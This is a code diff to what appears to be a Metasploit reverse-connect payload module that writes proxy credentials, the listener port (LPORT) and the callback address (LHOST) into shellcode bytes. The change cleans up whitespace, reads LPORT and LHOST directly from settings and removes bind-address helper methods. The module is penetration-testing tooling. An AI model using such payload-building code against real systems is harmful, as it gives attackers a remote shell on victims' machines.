@@ -100,7 +100,7 @@ module Metasploit3
     p[proxyloc-4] = [calloffset].pack('V')[0]
 
     #Optional authentification
-    if 	(datastore['PROXY_USERNAME'].nil? or datastore['PROXY_USERNAME'].empty?) or
+    if (datastore['PROXY_USERNAME'].nil? or datastore['PROXY_USERNAME'].empty?) or
       (datastore['PROXY_PASSWORD'].nil? or datastore['PROXY_PASSWORD'].empty?) or
       datastore['PROXY_TYPE'] == 'SOCKS'
 
@@ -110,7 +110,7 @@ module Metasploit3
     else
       username_size_diff = 14 - datastore['PROXY_USERNAME'].length
       password_size_diff = 14 - datastore['PROXY_PASSWORD'].length
-      jmp_offset = 	16 + #PROXY_AUTH_START length
+      jmp_offset = 16 + #PROXY_AUTH_START length
           15 + #PROXY_AUTH_STOP length
           username_size_diff + # difference between datastore PROXY_USERNAME length  and db "PROXY_USERNAME length"
           password_size_diff   # same with PROXY_PASSWORD
@@ -132,7 +132,7 @@ module Metasploit3
     p[p.length - 4, 4] = [p[p.length - 4, 4].unpack("l")[0] + jmp_offset].pack("V")
 
     # patch the LPORT
-    lport = bind_port
+    lport = datastore['LPORT']
 
     lportloc = p.index("\x68\x5c\x11\x00\x00")  # PUSH DWORD 4444
     p[lportloc+1] = [lport.to_i].pack('V')[0]
@@ -142,7 +142,7 @@ module Metasploit3
 
     # append LHOST and return payload
 
-    lhost = bind_address
+    lhost = datastore['LHOST']
     p + lhost.to_s + "\x00"
 
   end
@@ -152,33 +152,6 @@ module Metasploit3
   #
   def wfs_delay
     20
-  end
-
-protected
-
-  def bind_port
-    port = datastore['ReverseListenerBindPort'].to_i
-    port > 0 ? port : datastore['LPORT'].to_i
-  end
-
-  def bind_address
-    # Switch to IPv6 ANY address if the LHOST is also IPv6
-    addr = Rex::Socket.resolv_nbo(datastore['LHOST'])
-    # First attempt to bind LHOST. If that fails, the user probably has
-    # something else listening on that interface. Try again with ANY_ADDR.
-    any = (addr.length == 4) ? "0.0.0.0" : "::0"
-
-    addrs = [ Rex::Socket.addr_ntoa(addr), any  ]
-
-    if not datastore['ReverseListenerBindAddress'].to_s.empty?
-      # Only try to bind to this specific interface
-      addrs = [ datastore['ReverseListenerBindAddress'] ]
-
-      # Pick the right "any" address if either wildcard is used
-      addrs[0] = any if (addrs[0] == "0.0.0.0" or addrs == "::0")
-    end
-
-    addrs
   end
 
 end
